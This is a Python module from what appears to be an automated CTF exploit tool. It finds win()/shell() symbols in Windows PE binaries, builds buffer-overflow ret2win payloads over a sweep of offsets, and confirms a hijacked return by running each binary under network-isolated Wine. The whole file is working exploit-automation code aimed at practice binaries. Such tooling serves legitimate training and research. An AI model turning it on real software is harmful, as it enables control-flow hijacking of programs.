"""Windows PE: ret2win verified by execution under Wine. ROADMAP v0.3: "Windows PE dynamic +
symbolic. Wine sandbox for `dbg_run_input`, and SimProcedures for the MSVCRT/mingw runtime so
`angr_reachable` works properly on PE."

This covers the DYNAMIC half: the same classic ret2win shape `autopoc.py` already verifies for
ELF (a linear overflow with no canary/ASLR-defeating win() gift function), but for a PE32+
binary, run under Wine instead of natively. No pwntools ELF()/ROP() here -- pwntools' ELF class
does not load PE -- so the win()-like symbol is found with plain `nm` (binutils reads COFF/PE
symbol tables as readily as ELF ones; no mingw-specific binary needed) and the payload is built
by hand, same idea as `autopoc.py`'s own `build_script`/offset sweep.

Honest scope: no ASLR/DEP bypass, no SEH-based hijack, no canary (MinGW does not add one unless
`-fstack-protector` is passed) -- this is the direct analogue of the ELF ret2win increment, not
a general PE exploitation engine. The symbolic half (`angr_reachable` with MSVCRT/mingw
SimProcedures so it actually resolves calls on a PE without crashing into unmodeled externals)
is NOT part of this increment -- see ROADMAP.md."""
from __future__ import annotations

import os
import re
import shutil
import struct
import subprocess
from typing import Optional

from ._sandbox import _net_prefix

_OFFS = [72, 64, 80, 88, 96, 104, 56, 48, 112, 120, 40]
_WIN_RE = re.compile(r"(?:^|\.)(win|shell|backdoor|giveshell)$")
_MARK = b"[+] win reached"


def is_pe(binary: str) -> bool:
    try:
        with open(binary, "rb") as f:
            return f.read(2) == b"MZ"
    except OSError:
        return False


def wine_available() -> bool:
    return bool(shutil.which("wine") or shutil.which("wine64"))


def _wine_prefix_dir() -> str:
    return os.environ.get("WINEPREFIX") or os.path.join(os.path.expanduser("~"), ".wine")


def _ensure_wine_ready(timeout_s: int = 120) -> None:
    """Gap real encontrado y confirmado en vivo: la PRIMERA invocacion de Wine en un prefix
    nuevo (ningun `~/.wine` previo -- el caso de CUALQUIER runner de CI o contenedor recien
    creado) inicializa registro/dosdevices/RPC desde cero y tarda ~55s -- nada que ver con el
    overflow que se esta probando. Sin esto, el PRIMER offset del sweep de abajo (72, el que
    de verdad es correcto para este patron) se comia ese coste de arranque entero dentro de SU
    PROPIO budget_s (15s por defecto), el subprocess se mataba por timeout antes de que win()
    llegara a imprimir nada, y el sweep pasaba a probar el resto de offsets -- que por
    construccion NUNCA iban a disparar win() -- dando un falso 'no verificado' siempre, no a
    veces. Confirmado con cronometraje real: `wine <win_chall.exe>` en un prefix frio, 55s;
    `wine wineboot --init` solo (mismo coste de inicializacion, sin cargar el PE del reto),
    ~6.5s; el MISMO `wine <win_chall.exe>` inmediatamente despues, 0.46s. Por eso este
    pre-calentamiento corre ANTES del sweep, con su propio timeout generoso, en vez de
    repartir ese coste entre los intentos cronometrados. Se cachea comprobando `system.reg`
    (el fichero que `wineboot` escribe solo al completar la inicializacion, no solo que el
    directorio exista) para no re-pagar el coste en invocaciones posteriores."""
    if os.path.exists(os.path.join(_wine_prefix_dir(), "system.reg")):
        return
    exe = shutil.which("wine") or shutil.which("wine64")
    if not exe:
        return
    try:
        subprocess.run([exe, "wineboot", "--init"], capture_output=True, timeout=timeout_s)
    except Exception:
        pass


def find_win_pe(binary: str) -> Optional[int]:
    """Busca un simbolo win()/shell()/backdoor()/giveshell() con `nm` -- lee tablas de
    simbolos COFF/PE igual que ELF, sin necesitar un binutils con prefijo mingw. None si el
    binario esta stripped o no tiene ninguno de esos nombres."""
    nm = shutil.which("nm") or shutil.which("x86_64-w64-mingw32-nm")
    if not nm:
        return None
    try:
        out = subprocess.run([nm, binary], capture_output=True, text=True, timeout=20).stdout
    except Exception:
        return None
    best = None
    for line in out.splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        addr_s, kind, name = parts[0], parts[1], parts[-1]
        if kind.upper() != "T":   # solo simbolos de codigo (texto), no datos/importados
            continue
        if _WIN_RE.search(name):
            try:
                addr = int(addr_s, 16)
            except ValueError:
                continue
            if best is None or name == "win":
                best = addr
    return best


def _run_wine(binary: str, payload: bytes, timeout: int) -> bytes:
    # Aislamiento de red (unshare -n) igual que el sandbox nativo. Deliberadamente SIN los
    # rlimits de memoria/procesos que _rlimit_preexec aplica al resto del motor: confirmado en
    # vivo que un RLIMIT_AS de ~2GB (que a un proceso pwntools normal le sobra) hace que wine
    # ni siquiera pueda arrancar su propio wineserver ("could not exec wineserver") -- Wine
    # reserva un espacio de direcciones mucho mayor para emular el de Windows, aunque no lo
    # llegue a comprometer. El propio `timeout` del subprocess sigue acotando tiempo de CPU.
    prefix = _net_prefix()
    exe = shutil.which("wine") or shutil.which("wine64")
    cmd = [*prefix, exe, binary]
    try:
        r = subprocess.run(cmd, input=payload, capture_output=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired as e:
        return (e.stdout or b"") + (e.stderr or b"")
    except Exception as e:
        return str(e).encode()


def autopoc_pe(binary: str, run: bool = True, budget_s: int = 15) -> dict:
    """ret2win sobre un PE32+ ejecutado bajo Wine, verificado por ejecucion real (el propio
    win() del binario imprime su marcador antes de hacer system("cmd.exe"), igual que la
    version ELF)."""
    if not is_pe(binary):
        return {"ok": False, "note": "no es un PE (falta la firma 'MZ')"}
    if not wine_available():
        return {"ok": False, "note": "wine no esta instalado (apt install wine) -- necesario "
                                     "para ejecutar un PE en Linux"}
    win_addr = find_win_pe(binary)
    if win_addr is None:
        return {"ok": False, "note": "no se encontro un simbolo win()/shell()/backdoor()/"
                                     "giveshell() (binario stripped, o sin esa forma de practica)"}
    if not run:
        return {"ok": True, "verified": False, "detail": f"win={hex(win_addr)}",
               "note": f"win() encontrado en {hex(win_addr)}; run=False, no se ejecuta"}

    _ensure_wine_ready()
    p64 = lambda x: struct.pack("<Q", x)
    for off in _OFFS:
        payload = b"A" * off + p64(win_addr) + b"\n"
        out = _run_wine(binary, payload, budget_s)
        if _MARK in out:
            return {"ok": True, "verified": True, "detail": f"off={off} win={hex(win_addr)}",
                   "output": out.decode("utf-8", "replace"), "engine": "wine",
                   "note": f"ret2win (PE/Wine): shell/win() verificado por ejecucion (wine), "
                           f"offset={off}"}
    return {"ok": True, "verified": False, "detail": f"win={hex(win_addr)}", "engine": "wine",
           "note": "ret2win (PE/Wine): no verificado (ningun offset probado disparo win(); "
                   "puede necesitar un offset distinto o el binario no es vulnerable a un "
                   "overflow lineal)"}


def render_poc_pe(r: dict) -> str:
    out = ["## Auto ret2win (PE, Wine, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell/win() verificado en Wine: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip()[-2000:] + "\n```")
    return "\n".join(out)
